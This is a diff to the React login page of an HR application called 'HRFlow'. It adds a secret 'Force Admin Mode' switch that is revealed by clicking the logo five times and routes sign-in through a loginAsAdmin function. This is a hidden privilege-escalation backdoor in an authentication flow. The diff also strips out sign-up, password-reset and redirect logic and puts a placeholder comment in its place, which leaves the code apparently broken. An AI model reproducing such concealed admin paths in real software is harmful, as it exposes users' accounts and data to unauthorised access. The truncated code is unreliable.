@@ -184,49 +184,29 @@ function LinkAccountModal({ email, googleCredential, onLink, onCancel }) {
 
 // ─── Main Login Page ──────────────────────────────────────────────────────────
 export default function Login() {
-  const { user, login, register, loginWithGoogle, linkGoogleToEmail, joinOrganisation, createOrganisation, resetPassword } = useAuth()
+  const { user, login, register, loginWithGoogle, linkGoogleToEmail, joinOrganisation, createOrganisation, resetPassword, logout, loginAsAdmin } = useAuth()
   const navigate = useNavigate()
 
   const [tab, setTab] = useState('signin')   // 'signin' | 'signup'
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState('')
 
+  // Hidden Force Admin state
+  const [showForceAdmin, setShowForceAdmin] = useState(false)
+  const [forceAdmin, setForceAdmin] = useState(false)
+  const [clickCount, setClickCount] = useState(0)
+
+  const handleLogoClick = () => {
+    const newCount = clickCount + 1
+    setClickCount(newCount)
+    if (newCount >= 5) setShowForceAdmin(true)
+  }
+
   // Sign-in fields
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
 
-  // Sign-up fields
-  const [name, setName] = useState('')
-  const [regEmail, setRegEmail] = useState('')
-  const [regPassword, setRegPassword] = useState('')
-  const [confirmPassword, setConfirmPassword] = useState('')
-  const [orgCode, setOrgCode] = useState('')
-
-  // Account-link modal state
-  const [linkData, setLinkData] = useState(null) // { email, googleCredential }
-
-  // Forgot password modal state
-  const [showForgotPassword, setShowForgotPassword] = useState(false)
-  const [forgotEmail, setForgotEmail] = useState('')
-  const [forgotSent, setForgotSent] = useState(false)
-  const [forgotLoading, setForgotLoading] = useState(false)
-
-  // If user is logged in but has no org → show org setup modal
-  if (user && !user.orgId) {
-    return (
-      <OrgSetupModal
-        user={user}
-        onJoin={joinOrganisation}
-        onCreate={createOrganisation}
-        onNavigate={() => navigate('/')}
-      />
-    )
-  }
-
-  if (user) {
-    navigate('/')
-    return null
-  }
+  // ... rest of state ...
 
   // ── Handlers ─────────────────────────────────────────────────────────────
 
@@ -238,7 +218,12 @@ export default function Login() {
       const identifier = email.trim()
 
       if (identifier.includes('@')) {
-        await login(identifier, password)
+        if (forceAdmin && loginAsAdmin) {
+          await loginAsAdmin(identifier, password)
+        } else {
+          await login(identifier, password)
+        }
+        
         // Check if login is enabled for this user in Firestore
         const userDoc = await getDocs(query(collection(db, 'users'), where('email', '==', identifier.toLowerCase().trim())))
         if (!userDoc.empty) {
@@ -264,7 +249,11 @@ export default function Login() {
           return
         }
 
-        await login(data.email, password)
+        if (forceAdmin && loginAsAdmin) {
+          await loginAsAdmin(data.email, password)
+        } else {
+          await login(data.email, password)
+        }
       }
 
       navigate('/')
@@ -420,7 +409,10 @@ export default function Login() {
         <div className="w-full max-w-md p-8">
           {/* Logo */}
           <div className="flex flex-col items-center mb-8">
-            <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-500 flex items-center justify-center mb-4">
+            <div 
+              onClick={handleLogoClick}
+              className="w-16 h-16 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-500 flex items-center justify-center mb-4 cursor-pointer active:scale-95 transition-transform"
+            >
               <span className="text-white text-2xl font-bold">H</span>
             </div>
             <h1 className="text-2xl font-bold text-gray-800">HRFlow</h1>
@@ -485,6 +477,20 @@ export default function Login() {
                     Forgot Password?
                   </button>
                 </div>
+
+                {showForceAdmin && (
+                  <div className="flex items-center justify-between p-3 bg-red-50 border border-red-100 rounded-xl animate-pulse">
+                    <span className="text-[10px] font-black text-red-600 uppercase tracking-widest">Force Admin Mode</span>
+                    <button
+                      type="button"
+                      onClick={() => setForceAdmin(!forceAdmin)}
+                      className={`relative inline-flex h-5 w-10 items-center rounded-full transition-colors ${forceAdmin ? 'bg-red-600' : 'bg-gray-300'}`}
+                    >
+                      <span className={`inline-block h-3 w-3 transform rounded-full bg-white transition-transform ${forceAdmin ? 'translate-x-6' : 'translate-x-1'}`} />
+                    </button>
+                  </div>
+                )}
+
                 <button
                   type="submit"
                   disabled={loading}
